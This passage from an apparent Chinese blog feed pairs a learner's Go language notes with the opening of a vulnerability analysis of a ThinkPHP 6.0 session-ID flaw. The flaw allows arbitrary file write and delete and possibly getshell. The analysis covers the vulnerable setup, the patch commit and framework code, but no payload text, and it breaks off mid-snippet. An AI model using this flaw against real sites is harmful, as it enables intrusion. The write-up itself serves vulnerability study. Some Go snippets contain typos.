Python</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">string</span> <span class="title">download</span>(<span class="title">const</span> <span class="title">R</span>&amp; <span class="title">retriver</span>) &#123;</span></span><br><span class="line">    <span class="keyword">return</span> retriver.get(<span class="string">"http://qq.com"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java 中的类似代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入的参数必须实现 Retriever 接口</span></span><br><span class="line"><span class="comment">// 不是 duck typing</span></span><br><span class="line"><span class="comment">// 同时需要 Readable、Appendable 怎么办？（Apache polygene）</span></span><br><span class="line">&lt;R extends Retriver&gt;</span><br><span class="line"><span class="function">String <span class="title">download</span><span class="params">(R r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r.get(<span class="string">"http://qq.com"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Retriver <span class="keyword">interface</span> &#123;</span><br><span class="line">    Get(source <span class="keyword">string</span>) <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">download</span><span class="params">(retriver Retriver)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> retriver.Get(<span class="string">"http://qq.com"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的概念"><a href="#接口的概念" class="headerlink" title="接口的概念"></a>接口的概念</h3><p>接口由使用者定义</p><p>接口的实现时隐式的，只要实现里面的方法（不太理解这句话</p><p>接口本身不能创建实例，但可以指向一个实现了该接口的（自定义）类型的变量。</p><p>一个自定义类型需要将某个接口的所有方法都实现，才说这个自定义类型实现了该接口，否则编译不通过。</p><p>一个自定义类型可以实现多个接口</p><p>一个接口可以继承多个接口</p><p>interface 类型默认是一个指针</p><p>空接口 <code>interface{}</code> 没有任何方法，所以所有类型都实现了空接口，即可以把任何一个变量赋值给空接口。</p><p><strong>类型断言</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float32</span> = <span class="number">1.1</span></span><br><span class="line">x = f</span><br><span class="line">y := x.(<span class="keyword">float32</span>)  <span class="comment">// 这里改成 float64 将 panic</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加入检测</span></span><br><span class="line"><span class="keyword">if</span> y, ok := x.(<span class="keyword">float32</span>); ok &#123;</span><br><span class="line">    <span class="comment">// xx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>继承与接口</strong></p><p>当 A 结构体继承了 B 结构体，那么 A 就有了 B 的所有字段和方法，并可以直接调用。</p><p>当 A 结构体需要扩展功能，同时不希望破坏继承关系，实现某个接口即可。</p><p>因此，实现接口可以看做是对继承机制的补充。</p><p>继承的价值：解决代码的复用性和可维护性。</p><p>接口的价值：设计，设计好各种规范（方法），让其它自定义类型去实现这种方法。</p><p>接口比继承更加灵活，继承是满足 is-a 的关系，而接口只需满足 like-a 的关系，在一定程度上实现了解耦。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbaenlc9mtj20gs05dtc1.jpg" alt="image.png"></p><h3 id="接口的定义和实现"><a href="#接口的定义和实现" class="headerlink" title="接口的定义和实现"></a>接口的定义和实现</h3><blockquote><p>实际上就是实现了多态，同样的方法在不同对象调用时表现不同的意义？</p><p>还有个典型的列子，即 <code>sort()</code>，需要实现三个方法就可以给自定义类型排序</p><ul><li>Len</li><li>Less</li><li>Swap</li></ul></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 几何学接口</span></span><br><span class="line"><span class="keyword">type</span> geometry <span class="keyword">interface</span> &#123;</span><br><span class="line">    area() <span class="keyword">float64</span></span><br><span class="line">    perim() <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> rect <span class="keyword">struct</span> &#123;</span><br><span class="line">    width, height <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> circle <span class="keyword">struct</span> &#123;</span><br><span class="line">    radius <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span> <span class="title">area</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r rect)</span> <span class="title">perim</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (r.width + r.height) * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span> <span class="title">area</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Pi * c.radius * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c circle)</span> <span class="title">perim</span><span class="params">()</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * math.Pi * c.radius</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统一</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">measure</span><span class="params">(g geometry)</span></span> &#123;</span><br><span class="line">    fmt.Println(g)</span><br><span class="line">    fmt.Println(g.area())</span><br><span class="line">    fmt.Println(g.perim())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := rect&#123;width: <span class="number">3</span>, height: <span class="number">4</span>&#125;</span><br><span class="line">    c := circle&#123;radius: <span class="number">5</span>&#125;</span><br><span class="line">    </span><br><span class="line">    measure(r)</span><br><span class="line">    measure(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的值类型"><a href="#接口的值类型" class="headerlink" title="接口的值类型"></a>接口的值类型</h3><h3 id="接口的组合"><a href="#接口的组合" class="headerlink" title="接口的组合"></a>接口的组合</h3><h3 id="常用系统接口"><a href="#常用系统接口" class="headerlink" title="常用系统接口"></a>常用系统接口</h3><h2 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h2><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>函数内的局部变量 + 匿名函数构成闭包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adder</span><span class="params">()</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">sum := <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(value <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">sum += value</span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为函数实现接口</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>使用反射遍历结构体字段，调用结构体的方法，并获取结构体标签的值。</p><p>定义多个函数，再定义一个适配器函数用作统一处理接口。</p><p>使用反射创建并操作结构体。</p><h2 id="错误处理和资源管理"><a href="#错误处理和资源管理" class="headerlink" title="错误处理和资源管理"></a>错误处理和资源管理</h2><h3 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h3><p>延时机制，在 return 后再调用，先 defer 的后调用。</p><p>常常需要创建资源（数据库连接、文件句柄、锁），使用 defer 来关闭更省心。</p><h3 id="错误处理概念"><a href="#错误处理概念" class="headerlink" title="错误处理概念"></a>错误处理概念</h3><h3 id="服务器统一出错处理"><a href="#服务器统一出错处理" class="headerlink" title="服务器统一出错处理"></a>服务器统一出错处理</h3><h3 id="panic-和-recover"><a href="#panic-和-recover" class="headerlink" title="panic 和 recover"></a>panic 和 recover</h3><p>panic 一旦出错直接终止程序。</p><p>recover 可对接收到的错误自定义处理。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err &#123;</span><br><span class="line">        <span class="built_in">println</span>(err)</span><br><span class="line">    &#125; </span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><h3 id="问题追踪和调试"><a href="#问题追踪和调试" class="headerlink" title="问题追踪和调试"></a>问题追踪和调试</h3><h4 id="打印日志"><a href="#打印日志" class="headerlink" title="打印日志"></a>打印日志</h4><h4 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h4><h2 id="测试与性能调优"><a href="#测试与性能调优" class="headerlink" title="测试与性能调优"></a>测试与性能调优</h2><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>测试用例文件名必须以 <code>_test.go</code> 结尾。</p><p>测试函数必须以 <code>Test</code> 开头，并传入 <code>t *test.T</code> 参数。</p><h3 id="代码覆盖率和性能测试"><a href="#代码覆盖率和性能测试" class="headerlink" title="代码覆盖率和性能测试"></a>代码覆盖率和性能测试</h3><h3 id="使用-pprof-进行性能调优"><a href="#使用-pprof-进行性能调优" class="headerlink" title="使用 pprof 进行性能调优"></a>使用 pprof 进行性能调优</h3><h3 id="测试-http-服务器"><a href="#测试-http-服务器" class="headerlink" title="测试 http 服务器"></a>测试 http 服务器</h3><h3 id="生成文档和示例代码"><a href="#生成文档和示例代码" class="headerlink" title="生成文档和示例代码"></a>生成文档和示例代码</h3><h2 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h2><p>Go 实现了 CSP（通信顺序进程，Communicaing Sequential Process）模型来作为 goroutine 间的推荐通信方式</p><h3 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h3><p><strong>MPG模式</strong></p><p>M：操作系统的主线程（物理线程）</p><p>P：协程执行需要的上下文</p><p>G：协程</p><p>如果协程中出现了 panic，则整个程序都会崩溃。</p><p>设置运行 CPU 数量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">num := runtime.NumCPU()  <span class="comment">// 获取系统的逻辑CPU个数</span></span><br><span class="line">runtime.GOMAXPROCS(<span class="number">233</span>)  <span class="comment">// 指定数量，go 1.8 后默认运行在多核上</span></span><br></pre></td></tr></table></figure><h3 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h3><blockquote><p>不要通过共享内存来通信，而应通过通信来共享内存</p></blockquote><p>类似 Unix 下的双向管道，可指定单向，用于goroutine 之间通信，可传送任意数据类型。符号为 <code>&lt;- chan &lt;-</code>。</p><p>线程安全，多 goroutine 访问时，不需要加锁，即本身就是线程安全的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// goroutine 与 main 通信</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        channel &lt;- <span class="string">"Hello"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数所处的也是一个 goroutine，main 函数一旦运行结束退出，其他的 goroutine 会被杀掉。</p><p>指定 channel 的 buffer</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>channel 默认是阻塞的，满了阻塞写，空了阻塞读。</p><p>获取 channel 内容可使用 range 遍历，但发送方 channel 要手动 close 一下。</p><p>Go 中的 select</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for 指定次数</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg1 := &lt;- c1:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">    <span class="keyword">case</span> msg2 := &lt;- c2:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设定 timeout</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    timeout_cnt := <span class="number">0</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg1 := &lt;- c1:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">case</span> msg2 := &lt;- c2:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">case</span> &lt;- time.After(time.Second * <span class="number">30</span>):</span><br><span class="line">        timeout_cnt++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> time_cnt &gt; <span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无阻塞 channel</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg1 := &lt;- c1:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">case</span> msg2 := &lt;- c2:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">// 加入 default 后无阻塞</span></span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 channel，channel 会返回两个值，一个是内容，一个是还有没有内容</span></span><br><span class="line"><span class="built_in">close</span>(channel)</span><br><span class="line"></span><br><span class="line">more := <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> more &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg, more = &lt;- channel:</span><br><span class="line">            <span class="keyword">if</span> more &#123;</span><br><span class="line"><span class="comment">// xx</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// xx</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="理解调度器"><a href="#理解调度器" class="headerlink" title="理解调度器"></a>理解调度器</h3><h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><p>这样的函数还有很多，参看 <a href="http://golang.org/pkg/sync/atomic/" target="_blank" rel="noopener">go 的 atomic 包文档</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imort <span class="string">"sync/atomic"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cnt <span class="keyword">uint32</span> = <span class="number">0</span></span><br><span class="line">atomic.AddUint32(&amp;cnt, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cntFinal := atomic.LoadUint32(&amp;cnt)  <span class="comment">// 取数据</span></span><br></pre></td></tr></table></figure><h3 id="互斥锁-Mutex"><a href="#互斥锁-Mutex" class="headerlink" title="互斥锁 Mutex"></a>互斥锁 Mutex</h3><h3 id="读写锁-RWMutex"><a href="#读写锁-RWMutex" class="headerlink" title="读写锁 RWMutex"></a>读写锁 RWMutex</h3><h3 id="Once"><a href="#Once" class="headerlink" title="Once"></a>Once</h3><p>调用无数次也只执行一次。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line">onceBody := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(time.Now())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        once.Do(onceBody)</span><br><span class="line">        done &lt;- <span class="literal">true</span></span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    fmt.Println(&lt;- done)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WaitGroup"><a href="#WaitGroup" class="headerlink" title="WaitGroup"></a>WaitGroup</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A WaitGroup must not be copied after first use.</span></span><br><span class="line"><span class="comment">// 传给 goroutine 时需要传指针</span></span><br><span class="line">wg := sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line">wg.Add(<span class="number">10</span>)  <span class="comment">// 创建 goroutine 时添加</span></span><br><span class="line">wg.Done()  <span class="comment">// goroutine 对应的函数运行结束后调用 Done</span></span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br></pre></td></tr></table></figure><h3 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h3><h3 id="定时器-Timers"><a href="#定时器-Timers" class="headerlink" title="定时器 Timers"></a>定时器 Timers</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timer</span><br></pre></td></tr></table></figure><h2 id="写个爬虫"><a href="#写个爬虫" class="headerlink" title="写个爬虫"></a>写个爬虫</h2><blockquote><p>简单分布式爬虫，爬取相亲网站资料</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb7jrimvxij20tw09v3zs.jpg" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;为什么要学-Go？&quot;&gt;&lt;a href=&quot;#为什么要学-Go？&quot; class=&quot;headerlink&quot; title=&quot;为什么要学 Go？&quot;&gt;&lt;/a&gt;为什么要学 Go？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;以下引用自左耳听风专栏。&lt;/p&gt;
&lt;/blockquote
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://wywwzjj.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 6.0 任意文件写入</title>
    <link href="https://wywwzjj.top/2020/01/17/ThinkPHP-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <id>https://wywwzjj.top/2020/01/17/ThinkPHP-6-0-任意文件写入/</id>
    <published>2020-01-17T05:23:27.000Z</published>
    <updated>2020-01-29T15:18:16.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>2020 年 1 月 10 日，ThinkPHP 团队发布一个补丁更新，修复了一处由不安全的 SessionId 导致的任意文件操作漏洞。</p><p>该漏洞允许攻击者在目标环境启用 session 的条件下创建任意文件以及删除任意文件，在特定情况下可 getshell。</p><p>具体受影响版本为 ThinkPHP 6.0.0 - 6.0.1。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>composer 创建项目。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=6.0.0 thinkphp6.0.0</span><br></pre></td></tr></table></figure><p>在 app/controller/Index.php 中加一行代码，使 session 内容可控，方便漏洞复现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        session(<span class="string">'test'</span>, input(<span class="string">'j'</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>PS：TP 6 默认没开启 session，手动开下，在 app/middleware.php 取消注释即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb4a0ti4lcj213e0720tb.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb49ddcctkj20jr07lgt2.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb49jb7nx7j213g09lt9q.jpg" alt="image.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p><p>如果传入的 $id 长度为 32 即可控。TP 6.0.2 加了个条件，用 <code>ctype_alnum</code> 检测了下 ​$id，只能是字母或数字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># src/think/session/Store.php</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = is_string($id) &amp;&amp; strlen($id) === <span class="number">32</span> ? $id : md5(microtime(<span class="keyword">true</span>) . session_create_id());</span><br></pre></td></tr></table></figure><p><code>handle</code> 函数将 cookie 中的 <code>PHPSESSID</code> 对应的值设为 sessionId。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// middleware/SessionInit.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">($request, Closure $next)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    $varSessionId = <span class="keyword">$this</span>-&gt;app-&gt;config-&gt;get(<span class="string">'session.var_session_id'</span>);</span><br><span class="line">    $cookieName   = <span class="keyword">$this</span>-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) &#123;</span><br><span class="line">        $sessionId = $request-&gt;request($varSessionId);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $sessionId = $request-&gt;cookie($cookieName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($sessionId) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;session-&gt;setId($sessionId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gb48yn48kvj20ph0263yf.jpg" alt="image.png"></p><p>剩下的文件处理其实就是 session 本身的处理了，比如 $_SESSION 数组被序列化后写入文件保存以及清除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 